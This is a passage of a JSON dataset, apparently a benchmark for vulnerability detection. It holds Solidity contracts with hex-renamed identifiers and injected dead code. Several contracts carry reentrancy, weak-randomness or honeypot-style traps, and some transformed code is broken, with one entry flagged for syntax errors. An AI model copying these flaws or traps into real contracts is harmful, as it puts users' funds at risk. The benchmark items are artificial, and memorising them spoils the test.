        "_newExtra": "_0xbe651e",
        "newPuppet": "_0xc50e1c",
        "setExtra": "_0x8ca0df",
        "withdraw": "_0xe5fadb",
        "puppets": "_0x523803",
        "master": "_0x927b1f",
        "target": "_0x3c17d0",
        "_share": "_0xda8948",
        "_count": "_0xddb965",
        "extra": "_0x09bead",
        "owner": "_0x418c95",
        "_addy": "_0xb2f286",
        "mul": "_0x6ddf01",
        "div": "_0x70b1ef",
        "sub": "_0x850b4f",
        "add": "_0xbba3e8",
        "_id": "_0x7daf0b"
      },
      "changes": [
        "Renamed 20 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_172",
      "transformed_id": "ss_l4_medium_sn_ds_172",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// winner gets the contract balance\n// 0.02 to play\n\npragma solidity ^0.4.23;\n\ncontract FundManager {\n\n//constants\n\naddress public _0x08cf08 = 0x0;\naddress public _0x0c44aa;\naddress public _0xaba0f7 = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;\naddress public _0xb229d3 = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;\naddress[] public _0x78c8ba;\n\nmapping(address=>bool) _0x217612;\n\nuint256 public _0x444ce4;\nuint256[] public _0x401485 = [951828771,158769871220];\nuint256[] public balance;\n\n//constructor\n\nfunction DranMe() public payable{\n        if (false) { revert(); }\n        bool _flag2 = false;\n\t_0x0c44aa = msg.sender;\n}\n\n//modifiers\n\nmodifier _0x317e83() {\n    require(msg.sender == _0x0c44aa);\n    _;\n}\n\nmodifier _0xccc4d4() {\n    require(msg.sender == _0x08cf08);\n    _;\n}\n\nmodifier _0x8afee0() {\n    require(_0x217612[msg.sender]);\n    _;\n}\n\n//functions\n\nfunction _0xf75baa() public constant returns(uint256) {\n        uint256 _unused3 = 0;\n        if (false) { revert(); }\n\treturn _0x401485.length;\n}\n\nfunction _0x9e84b6(uint256 _0x8969ae) public payable _0x317e83{\n\t_0x444ce4 = _0x8969ae;\n}\n\nfunction _0x5005f4() public constant returns(uint256) {\n\treturn _0x78c8ba.length;\n}\n\nfunction _0x65a0ba() public constant returns(uint256) {\n\treturn address(this).balance;\n}\n\nfunction _0xf41431() public payable{\n\trequire(msg.value >= 0.02 ether);\n\t_0x78c8ba.push(msg.sender);\n\t_0x217612[msg.sender]=true;\n}\n\nfunction _0x3fb62d() public payable _0x8afee0{\n\trequire (msg.value >= 0.01 ether);\n\tif(msg.sender!=_0x0c44aa || _0xfdcb70()){\n\t    uint256 _0xae42ee = 0;\n        msg.sender.transfer(_0xae42ee);\n\t}\n}\n\nfunction _0xfdcb70() private returns(bool){\n    bytes32 _0x5711b7 = _0xa002c0(blockhash(block.number-1));\n    uint256 _0x444ce4 = uint256(_0x5711b7);\n        if(_0x444ce4%5==0){\n            _0x08cf08 = msg.sender;\n            return true;\n        }\n        else{\n            return false;\n        }\n    }\n\nfunction _0x084de8 () public payable _0x8afee0 {\n\trequire (msg.value >= 0.005 ether);\n\t_0xaba0f7.call.value(msg.value)();\n}\n\nfunction _0xc3ddcd () public payable _0x8afee0 {\n\trequire (msg.value >= 0.005 ether);\n\t_0xb229d3.call.value(msg.value)();\n}\n\nfunction _0x265628 (uint256 _0xad39e9, uint256 _0x45a52d) public payable _0x8afee0 {\n\t_0x401485[_0xad39e9] = _0x45a52d;\n}\n\nfunction _0x3e2a1d (uint256 _0xb48e50) public payable _0x8afee0 {\n\t_0x401485.length = _0xb48e50;\n}\n\nfunction _0x8a48a6 (uint256 _0x7b67c4) public payable _0x8afee0 returns(uint256) {\n\treturn (_0x7b67c4 / (_0x401485[0]*_0x401485[1]));\n\tif((_0x7b67c4 / (_0x401485[0]*_0x401485[1])) == _0x444ce4) {\n\t\t_0x0c44aa = _0x08cf08;\n\t}\n}\n\nfunction _0xf27543 () public payable _0x8afee0 returns(bool) {\n    require(msg.value >= 0.01 ether);\n    if(msg.value == _0x444ce4){\n        return true;\n    }\n}\n\nfunction _0x35740f() public payable _0x317e83 {\n\t_0x0c44aa.call.value(1 wei)();\n}\n\nfunction _0x1937f9() public payable _0xccc4d4 {\n\t_0x08cf08.transfer(address(this).balance);\n}\n\n//fallback function\n\nfunction() public payable{\n\t}\n}\n",
      "rename_map": {
        "callSecondTarget": "_0xc3ddcd",
        "manipulateSecret": "_0x3fb62d",
        "approvedPlayers": "_0x217612",
        "callFirstTarget": "_0x084de8",
        "getPlayerCount": "_0x5005f4",
        "unlockSecret": "_0xfdcb70",
        "becomePlayer": "_0xf41431",
        "secondTarget": "_0xb229d3",
        "firstTarget": "_0xaba0f7",
        "checkSecret": "_0xf27543",
        "onlyPlayers": "_0x8afee0",
        "claimPrize": "_0x1937f9",
        "onlyWinner": "_0xccc4d4",
        "onlyOwner": "_0x317e83",
        "getLength": "_0xf75baa",
        "guessSeed": "_0x8a48a6",
        "keccak256": "_0xa002c0",
        "setSecret": "_0x9e84b6",
        "getPrize": "_0x65a0ba",
        "winPrize": "_0x35740f",
        "setSeed": "_0x265628",
        "addSeed": "_0x3e2a1d",
        "_secret": "_0x8969ae",
        "players": "_0x78c8ba",
        "amount": "_0xae42ee",
        "_value": "_0x45a52d",
        "winner": "_0x08cf08",
        "_index": "_0xad39e9",
        "secret": "_0x444ce4",
        "owner": "_0x0c44aa",
        "_seed": "_0x7b67c4",
        "_add": "_0xb48e50",
        "seed": "_0x401485",
        "hash": "_0x5711b7"
      },
      "changes": [
        "Renamed 34 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_173",
      "transformed_id": "ss_l4_medium_sn_ds_173",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.11; /* originally >=0.4.11 */\n\ncontract Owned {\n    function Owned() {\n        if (true) { _0xdff6f2 = msg.sender; }\n    }\n\n    address public _0xdff6f2;\n\n    // This contract only defines a modifier and a few useful functions\n    // The function body is inserted where the special symbol \"_\" in the\n    // definition of a modifier appears.\n    modifier _0x94e05c { if (msg.sender == _0xdff6f2) _; }\n\n    function _0x61ff2b(address _0x4b4ec3) _0x94e05c {\n        _0xdff6f2 = _0x4b4ec3;\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function _0x062bc7(address _0xe42b4a, uint _0x45d59d, bytes _0x291791) _0x94e05c {\n        _0xe42b4a.call.value(_0x45d59d)(_0x291791);\n    }\n}\n// to get the needed token functions in the contract\ncontract Token {\n    function transfer(address, uint) returns(bool);\n    function _0x629705(address) constant returns (uint);\n}\n\ncontract TokenSender is Owned {\n    Token public _0x935f0a; // the token we are working with\n    uint public _0x2d416f;\n\n    uint public _0x144f9e;\n\n    struct Transfer {\n        address _0xa74649;\n        uint _0xcca278;\n    }\n\n    Transfer[] public _0xaa8be3;\n\n    function TokenSender(address _0x78b275) {\n        _0x935f0a = Token(_0x78b275);\n    }\n\n    // this is a used to save gas\n    uint constant D160 = 0x0010000000000000000000000000000000000000000;\n\n    // This is the function that makes the list of transfers and various\n    //  checks around that list, it is a little tricky, the data input is\n    //  structured with the `amount` and the (receiving) `addr` combined as one\n    //  long number and then this number is deconstructed in this function to\n    //  save gas and reduce the number of `0`'s that are needed to be stored\n    //   on the blockchain\n    function _0x0da269(uint[] data) _0x94e05c {\n\n        // If the send has started then we just throw\n        if (_0x144f9e>0) throw;\n\n        uint _0x7f4c27;\n        uint _0x682e78 = _0xaa8be3.length;\n        _0xaa8be3.length = _0xaa8be3.length + data.length;\n        for (uint i = 0; i < data.length; i++ ) {\n            address _0xa74649 = address( data[i] & (D160-1) );\n            uint _0xcca278 = data[i] / D160;\n\n            _0xaa8be3[_0x682e78 + i]._0xa74649 = _0xa74649;\n            _0xaa8be3[_0x682e78 + i]._0xcca278 = _0xcca278;\n            _0x7f4c27 += _0xcca278;\n        }\n        _0x2d416f += _0x7f4c27;\n    }\n    // This function actually makes the sends and tracks the amount of gas used\n    //  if it takes more gas than was sent with the transaction then this\n    //  function will need to be called a few times until\n    function _0x4960dd() _0x94e05c {\n        if (_0xaa8be3.length == 0) return;\n\n        // Keep next in the stack var mNext to save gas\n        uint _0xbb16d9 = _0x144f9e;\n\n        if (gasleft() > 0) { _0x144f9e = _0xaa8be3.length; }\n\n        if ((_0xbb16d9 == 0 ) && ( _0x935f0a._0x629705(this) != _0x2d416f)) throw;\n\n        while ((_0xbb16d9<_0xaa8be3.length) && ( gas() > 150000 )) {\n            uint _0xcca278 = _0xaa8be3[_0xbb16d9]._0xcca278;\n            address _0xa74649 = _0xaa8be3[_0xbb16d9]._0xa74649;\n            if (_0xcca278 > 0) {\n                if (!_0x935f0a.transfer(_0xa74649, _0xaa8be3[_0xbb16d9]._0xcca278)) throw;\n            }\n            _0xbb16d9 ++;\n        }\n\n        // Set the next to the actual state.\n        if (true) { _0x144f9e = _0xbb16d9; }\n    }\n\n    ///////////////////////\n    // Helper functions\n    ///////////////////////\n\n    function _0x8eaaac() constant returns (bool) {\n        if (_0xaa8be3.length == 0) return false;\n        if (_0x144f9e < _0xaa8be3.length) return false;\n        return true;\n    }\n\n    function _0xb63989() constant returns (uint) {\n        return _0xaa8be3.length;\n    }\n\n    function gas() internal constant returns (uint _0xf0c5ef) {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n        assembly {\n            _0xf0c5ef:= gas\n        }\n    }\n\n}",
      "rename_map": {
        "totalToDistribute": "_0x2d416f",
        "hasTerminated": "_0x8eaaac",
        "changeOwner": "_0x61ff2b",
        "nTransfers": "_0xb63989",
        "onlyOwner": "_0x94e05c",
        "transfers": "_0xaa8be3",
        "balanceOf": "_0x629705",
        "_newOwner": "_0x4b4ec3",
        "execute": "_0x062bc7",
        "amount": "_0xcca278",
        "_value": "_0x45d59d",
        "_token": "_0x78b275",
        "offset": "_0x682e78",
        "token": "_0x935f0a",
        "owner": "_0xdff6f2",
        "mNext": "_0xbb16d9",
        "_data": "_0x291791",
        "addr": "_0xa74649",
        "_gas": "_0xf0c5ef",
        "fill": "_0x0da269",
        "next": "_0x144f9e",
        "_dst": "_0xe42b4a",
        "run": "_0x4960dd",
        "acc": "_0x7f4c27"
      },
      "changes": [
        "Renamed 24 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_174",
      "transformed_id": "ss_l4_medium_sn_ds_174",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\n\n contract Lotto {\n\n     uint constant public _0x9d5742 = 6800;\n     // there are an infinite number of rounds (just like a real lottery that takes place every week). `blocksPerRound` decides how many blocks each round will last. 6800 is around a day.\n\n     uint constant public _0xa71849 = 100000000000000000;\n     // the cost of each ticket is .1 ether.\n\n     uint constant public _0x981b45 = 5000000000000000000;\n\n     function _0xc8783a() constant returns(uint){ return _0x9d5742; }\n     function _0xe9e1c4() constant returns(uint){ return _0xa71849; }\n     //accessors for constants\n\n     struct Round {\n         address[] _0x347026;\n         uint _0x94bd30;\n         uint _0x830149;\n         mapping(uint=>bool) _0x3e8f30;\n         mapping(address=>uint) _0xabc284;\n     }\n     mapping(uint => Round) _0xab3ef8;\n     //the contract maintains a mapping of rounds. Each round maintains a list of tickets, the total amount of the pot, and whether or not the round was \"cashed\". \"Cashing\" is the act of paying out the pot to the winner.\n\n     function _0x1ecd91() constant returns (uint){\n         //The round index tells us which round we're on. For example if we're on block 24, we're on round 2. Division in Solidity automatically rounds down, so we don't need to worry about decimals.\n\n         return block.number/_0x9d5742;\n     }\n\n     function _0xc15a91(uint _0x131043,uint _0x32892d) constant returns (bool){\n         //Determine if a given.\n\n         return _0xab3ef8[_0x131043]._0x3e8f30[_0x32892d];\n     }\n\n     function _0xf644e2(uint _0x131043, uint _0x32892d) constant returns(address){\n         //note this function only calculates the winners. It does not do any state changes and therefore does not include various validitiy checks\n\n         var _0x0d6a6c = _0x2411ad(_0x131043,_0x32892d);\n\n         if(_0x0d6a6c>block.number)\n             return;\n         //We can't decided the winner if the round isn't over yet\n\n         var _0xd9a5e8 = _0x0722ed(_0x0d6a6c);\n         var _0x153ad0 = _0xd9a5e8%_0xab3ef8[_0x131043]._0x830149;\n         //We perform a modulus of the blockhash to determine the winner\n\n         var _0x9aa8ff = uint256(0);\n\n         for(var _0xd9d601 = 0; _0xd9d601<_0xab3ef8[_0x131043]._0x347026.length; _0xd9d601++){\n             var _0xb6ac12 = _0xab3ef8[_0x131043]._0x347026[_0xd9d601];\n             _0x9aa8ff+=_0xab3ef8[_0x131043]._0xabc284[_0xb6ac12];\n\n             if(_0x9aa8ff>_0x153ad0){\n                 return _0xb6ac12;\n             }\n         }\n     }\n\n     function _0x2411ad(uint _0x131043,uint _0x32892d) constant returns (uint){\n         return ((_0x131043+1)*_0x9d5742)+_0x32892d;\n     }\n\n     function _0xd62651(uint _0x131043) constant returns(uint){\n         var _0xc3e20b = _0xab3ef8[_0x131043]._0x94bd30/_0x981b45;\n\n         if(_0xab3ef8[_0x131043]._0x94bd30%_0x981b45>0)\n             _0xc3e20b++;\n\n         return _0xc3e20b;\n     }\n\n     function _0x2f7bfe(uint _0x131043) constant returns(uint){\n         return _0xab3ef8[_0x131043]._0x94bd30/_0xd62651(_0x131043);\n     }\n\n     function _0xbfd92d(uint _0x131043, uint _0x32892d){\n\n         var _0xc3e20b = _0xd62651(_0x131043);\n\n         if(_0x32892d>=_0xc3e20b)\n             return;\n\n         var _0x0d6a6c = _0x2411ad(_0x131043,_0x32892d);\n\n         if(_0x0d6a6c>block.number)\n             return;\n\n         if(_0xab3ef8[_0x131043]._0x3e8f30[_0x32892d])\n             return;\n         //Subpots can only be cashed once. This is to prevent double payouts\n\n         var _0x6acefa = _0xf644e2(_0x131043,_0x32892d);\n         var _0x49bdfb = _0x2f7bfe(_0x131043);\n\n         _0x6acefa.send(_0x49bdfb);\n\n         _0xab3ef8[_0x131043]._0x3e8f30[_0x32892d] = true;\n         //Mark the round as cashed\n     }\n\n     function _0x0722ed(uint _0x71230a) constant returns(uint){\n         return uint(block.blockhash(_0x71230a));\n     }\n\n     function _0x558498(uint _0x131043,address _0xb6ac12) constant returns (address[]){\n         return _0xab3ef8[_0x131043]._0x347026;\n     }\n\n     function _0xb1c707(uint _0x131043,address _0xb6ac12) constant returns (uint){\n         return _0xab3ef8[_0x131043]._0xabc284[_0xb6ac12];\n     }\n\n     function _0x8414eb(uint _0x131043) constant returns(uint){\n         return _0xab3ef8[_0x131043]._0x94bd30;\n     }\n\n     function() {\n         //this is the function that gets called when people send money to the contract.\n\n         var _0x131043 = _0x1ecd91();\n         var value = msg.value-(msg.value%_0xa71849);\n\n         if(value==0) return;\n\n         if(value<msg.value){\n             msg.sender.send(msg.value-value);\n         }\n         //no partial tickets, send a partial refund\n\n         var _0x830149 = value/_0xa71849;\n         _0xab3ef8[_0x131043]._0x830149+=_0x830149;\n\n         if(_0xab3ef8[_0x131043]._0xabc284[msg.sender]==0){\n             var _0xaa71d5 = _0xab3ef8[_0x131043]._0x347026.length++;\n             _0xab3ef8[_0x131043]._0x347026[_0xaa71d5] = msg.sender;\n         }\n\n         _0xab3ef8[_0x131043]._0xabc284[msg.sender]+=_0x830149;\n         _0xab3ef8[_0x131043]._0x830149+=_0x830149;\n         //keep track of the total tickets\n\n         _0xab3ef8[_0x131043]._0x94bd30+=value;\n         //keep track of the total pot\n\n     }\n\n }\n",
      "rename_map": {
        "getTicketsCountByBuyer": "_0xb1c707",
        "getDecisionBlockNumber": "_0x2411ad",
        "ticketsCountByBuyer": "_0xabc284",
        "decisionBlockNumber": "_0x0d6a6c",
        "winningTicketIndex": "_0x153ad0",
        "getBlocksPerRound": "_0xc8783a",
        "decisionBlockHash": "_0xd9a5e8",
        "getSubpotsCount": "_0xd62651",
        "calculateWinner": "_0xf644e2",
        "blocksPerRound": "_0x9d5742",
        "getTicketPrice": "_0xe9e1c4",
        "getHashOfBlock": "_0x0722ed",
        "getRoundIndex": "_0x1ecd91",
        "buyersLength": "_0xaa71d5",
        "subpotsCount": "_0xc3e20b",
        "ticketsCount": "_0x830149",
        "blockReward": "_0x981b45",
        "ticketIndex": "_0x9aa8ff",
        "subpotIndex": "_0x32892d",
        "ticketPrice": "_0xa71849",
        "getIsCashed": "_0xc15a91",
        "blockIndex": "_0x71230a",
        "roundIndex": "_0x131043",
        "buyerIndex": "_0xd9d601",
        "getSubpot": "_0x2f7bfe",
        "getBuyers": "_0x558498",
        "isCashed": "_0x3e8f30",
        "buyers": "_0x347026",
        "winner": "_0x6acefa",
        "subpot": "_0x49bdfb",
        "getPot": "_0x8414eb",
        "rounds": "_0xab3ef8",
        "buyer": "_0xb6ac12",
        "cash": "_0xbfd92d",
        "pot": "_0x94bd30"
      },
      "changes": [
        "Renamed 35 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_201",
      "transformed_id": "ss_l4_medium_sn_ds_201",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract Private_Bank\n{\n    mapping (address => uint) public _0x760f5f;\n\n    uint public MinDeposit = 1 ether;\n\n    Log TransferLog;\n\n    function Private_Bank(address _0x52db24)\n    {\n        TransferLog = Log(_0x52db24);\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        if(msg.value >= MinDeposit)\n        {\n            _0x760f5f[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n\n    function CashOut(uint _0xaf8057)\n    {\n        if(_0xaf8057<=_0x760f5f[msg.sender])\n        {\n\n            if(msg.sender.call.value(_0xaf8057)())\n            {\n                _0x760f5f[msg.sender]-=_0xaf8057;\n                TransferLog.AddMessage(msg.sender,_0xaf8057,\"CashOut\");\n            }\n        }\n    }\n\n    function() public payable{}\n\n}\n\ncontract Log\n{\n\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x553dcc,uint _0xda6c2e,string _0xebbc31)\n    public\n    {\n        bool _flag3 = false;\n        if (false) { revert(); }\n        LastMsg.Sender = _0x553dcc;\n        LastMsg.Time = _0xd3f492;\n        LastMsg.Val = _0xda6c2e;\n        LastMsg.Data = _0xebbc31;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "balances": "_0x760f5f",
        "_data": "_0xebbc31",
        "_adr": "_0x553dcc",
        "_log": "_0x52db24",
        "_val": "_0xda6c2e",
        "_am": "_0xaf8057",
        "now": "_0xd3f492"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_202",
      "transformed_id": "ss_l4_medium_sn_ds_202",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract Multiplicator\n{\n    address public Owner = msg.sender;\n\n    function()payable{}\n\n    function _0xee39f2()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function _0x939147(address _0xd4225a)\n    payable\n    {\n        if(msg.value>=this.balance)\n        {\n            _0xd4225a.transfer(this.balance+msg.value);\n        }\n    }\n}",
      "rename_map": {
        "multiplicate": "_0x939147",
        "withdraw": "_0xee39f2",
        "adr": "_0xd4225a"
      },
      "changes": [
        "Renamed 3 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_203",
      "transformed_id": "ss_l4_medium_sn_ds_203",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n//\n//Live TEST ---- Please Do NOT use! Thanks! ----\n//\ncontract Ownable {\n    address public _0x87f495;\n    function Ownable() public {\n        bool _flag1 = false;\n        // Placeholder for future logic_0x87f495 = msg.sender;}\n    modifier _0xe5f6b5() {require(msg.sender == _0x87f495); _;\n    }\n}\n//CEO Throne .. The CEO with the highest stake gets the control over the contract\n//msg.value needs to be higher than largestStake when calling Stake()\n\ncontract CEOThrone is Ownable {\n    address public _0x87f495;\n    uint public _0x54736e;\n// Stake() function being called with 0xde20bc92 and ETH :: recommended gas limit 35.000\n// The sent ETH is checked against largestStake\n    function Stake() public payable {\n        // Placeholder for future logic\n        bool _flag4 = false;\n        // if you own the largest stake in a company, you own a company\n        if (msg.value > _0x54736e) {\n            _0x87f495 = msg.sender;\n            if (1 == 1) { _0x54736e = msg.value; }\n        }\n    }\n// withdraw() function being called with 0x3ccfd60b :: recommened gas limit 30.000\n    function _0x7b7eaa() public _0xe5f6b5 {\n        // only owner can withdraw funds\n        msg.sender.transfer(this.balance);\n    }\n}",
      "rename_map": {
        "largestStake": "_0x54736e",
        "onlyOwner": "_0xe5f6b5",
        "withdraw": "_0x7b7eaa",
        "owner": "_0x87f495"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 11, column 23', 'Syntax error at line 11, column 26']"
    },
    {
      "original_id": "sn_ds_204",
      "transformed_id": "ss_l4_medium_sn_ds_204",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "contract OpenAddressLottery{\n    struct SeedComponents{\n        uint _0x13fb26;\n        uint _0x53c95b;\n        uint _0xd97cb0;\n        uint _0x78a4fd;\n    }\n\n    address _0xab5bd8; //address of the owner\n    uint private _0xfa0b39; //seed used to calculate number of an address\n    uint private _0x7feba3; //last reseed - used to automatically reseed the contract every 1000 blocks\n    uint LuckyNumber = 7; //if the number of an address equals 7, it wins\n\n    mapping (address => bool) _0xacd542; //keeping track of addresses that have already won\n\n    function OpenAddressLottery() {\n        _0xab5bd8 = msg.sender;\n        _0x3f101f(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n\n    function _0x960c87() payable {\n        if(msg.value<0.1 ether)\n            return; //verify ticket price\n\n        // make sure he hasn't won already\n        require(_0xacd542[msg.sender] == false);\n\n        if(_0xba63cb(msg.sender) == LuckyNumber){ //check if it equals 7\n            _0xacd542[msg.sender] = true; // every address can only win once\n\n            uint _0x09bbf9=msg.value*7; //win = 7 times the ticket price\n\n            if(_0x09bbf9>this.balance) //if the balance isnt sufficient...\n                _0x09bbf9=this.balance; //...send everything we've got\n            msg.sender.transfer(_0x09bbf9);\n        }\n\n        if(block.number-_0x7feba3>1000) //reseed if needed\n            _0x3f101f(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n\n    function _0xba63cb(address _0x8a9fa0) constant returns(uint n){\n        // calculate the number of current address - 1 in 8 chance\n        n = uint(_0x4b7c3b(uint(_0x8a9fa0), _0xfa0b39)[0]) % 8;\n    }\n\n    function _0x3f101f(SeedComponents _0x45a4a9) internal {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n        _0xfa0b39 = uint256(_0x4b7c3b(\n            _0x45a4a9._0x13fb26,\n            _0x45a4a9._0x53c95b,\n            _0x45a4a9._0xd97cb0,\n            _0x45a4a9._0x78a4fd\n        )); //hash the incoming parameters and use the hash to (re)initialize the seed\n        _0x7feba3 = block.number;\n    }\n\n    function _0xb31b36() {\n        require(msg.sender==_0xab5bd8);\n\n        selfdestruct(msg.sender);\n    }\n\n    function _0x26a8fc() { //reseed initiated by the owner - for testing purposes\n        require(msg.sender==_0xab5bd8);\n\n        SeedComponents s;\n        s._0x13fb26 = uint(msg.sender);\n        s._0x53c95b = uint256(block.blockhash(block.number - 1));\n        s._0xd97cb0 = block.difficulty*(uint)(block.coinbase);\n        s._0x78a4fd = tx.gasprice * 7;\n\n        _0x3f101f(s); //reseed\n    }\n\n    function () payable { //if someone sends money without any function call, just assume he wanted to participate\n        if(msg.value>=0.1 ether && msg.sender!=_0xab5bd8) //owner can't participate, he can only fund the jackpot\n            _0x960c87();\n    }\n\n}\n",
      "rename_map": {
        "luckyNumberOfAddress": "_0xba63cb",
        "participate": "_0x960c87",
        "forceReseed": "_0x26a8fc",
        "components": "_0x45a4a9",
        "secretSeed": "_0xfa0b39",
        "lastReseed": "_0x7feba3",
        "component2": "_0x53c95b",
        "component3": "_0xd97cb0",
        "component4": "_0x78a4fd",
        "component1": "_0x13fb26",
        "keccak256": "_0x4b7c3b",
        "reseed": "_0x3f101f",
        "winner": "_0xacd542",
        "owner": "_0xab5bd8",
        "addr": "_0x8a9fa0",
        "kill": "_0xb31b36",
        "win": "_0x09bbf9"
      },
      "changes": [
        "Renamed 17 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_205",
      "transformed_id": "ss_l4_medium_sn_ds_205",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract NEW_YEARS_GIFT\n{\n    string _0x775417;\n\n    bool _0x253058 = false;\n\n    address sender;\n\n    bytes32 public _0x1fae2a;\n\n    function() public payable{}\n\n    function GetHash(bytes _0xa15967) public constant returns (bytes32) {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;return _0x3ef3cd(_0xa15967);}\n\n    function SetPass(bytes32 _0xa7d6d0)\n    public\n    payable\n    {\n        bool _flag3 = false;\n        bool _flag4 = false;\n        if( (!_0x253058&&(msg.value > 1 ether)) || _0x1fae2a==0x0 )\n        {\n            _0x1fae2a = _0xa7d6d0;\n            sender = msg.sender;\n        }\n    }\n\n    function SetMessage(string _0x17cb41)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            _0x775417 =_0x17cb41;\n        }\n    }\n\n    function GetGift(bytes _0xa15967)\n    external\n    payable\n    returns (string)\n    {\n        if(_0x1fae2a == _0x3ef3cd(_0xa15967))\n        {\n            msg.sender.transfer(this.balance);\n            return _0x775417;\n        }\n    }\n\n    function Revoce()\n    public\n    payable\n    {\n        if(msg.sender==sender)\n        {\n            sender.transfer(this.balance);\n            _0x775417=\"\";\n        }\n    }\n\n    function PassHasBeenSet(bytes32 _0xa7d6d0)\n    public\n    {\n        if(msg.sender==sender&&_0xa7d6d0==_0x1fae2a)\n        {\n           _0x253058=true;\n        }\n    }\n}",
      "rename_map": {
        "passHasBeenSet": "_0x253058",
        "_message": "_0x17cb41",
        "hashPass": "_0x1fae2a",
        "message": "_0x775417",
        "pass": "_0xa15967",
        "hash": "_0xa7d6d0",
        "sha3": "_0x3ef3cd"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_206",
      "transformed_id": "ss_l4_medium_sn_ds_206",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract Test1\n{\n    address _0xb61cf4 = msg.sender;\n\n    function _0x72b75a()\n    payable\n    public\n    {\n        require(msg.sender==_0xb61cf4);\n        _0xb61cf4.transfer(this.balance);\n    }\n\n    function() payable {}\n\n    function Test()\n    payable\n    public\n    {\n        if(msg.value>=1 ether)\n        {\n\n            var _0x8fd567 = 1;\n            var _0xc2fb9d = 0;\n            var _0x984e55 = msg.value*2;\n\n            while(true)\n            {\n                if(_0x8fd567<_0xc2fb9d)break;\n                if(_0x8fd567>_0x984e55)break;\n\n                _0xc2fb9d=_0x8fd567;\n                _0x8fd567++;\n            }\n            msg.sender.transfer(_0xc2fb9d);\n        }\n    }\n}",
      "rename_map": {
        "withdraw": "_0x72b75a",
        "owner": "_0xb61cf4",
        "amX2": "_0x984e55",
        "i1": "_0x8fd567",
        "i2": "_0xc2fb9d"
      },
      "changes": [
        "Renamed 5 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_207",
      "transformed_id": "ss_l4_medium_sn_ds_207",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\n\n// https://github.com/ethereum/EIPs/issues/20\ncontract ERC20 {\n    function _0xdd45cd() constant returns (uint _0xdd45cd);\n    function _0xa89d46(address _0x2bce26) constant returns (uint balance);\n    function transfer(address _0xe2f098, uint _0x4d2496) returns (bool _0x9141f6);\n    function _0x867d23(address _0xbc8f43, address _0xe2f098, uint _0x4d2496) returns (bool _0x9141f6);\n    function _0xe25806(address _0x161512, uint _0x4d2496) returns (bool _0x9141f6);\n    function _0x9f4599(address _0x2bce26, address _0x161512) constant returns (uint _0xe84423);\n    event Transfer(address indexed _0xbc8f43, address indexed _0xe2f098, uint _0x4d2496);\n    event Approval(address indexed _0x2bce26, address indexed _0x161512, uint _0x4d2496);\n}\n\ncontract RaceCondition{\n    address private _0x2e6e39;\n    uint public _0x049b5e;\n    ERC20 _0xb775b0;\n\n    function RaceCondition(uint _0xf16c36, ERC20 _0x752fea)\n        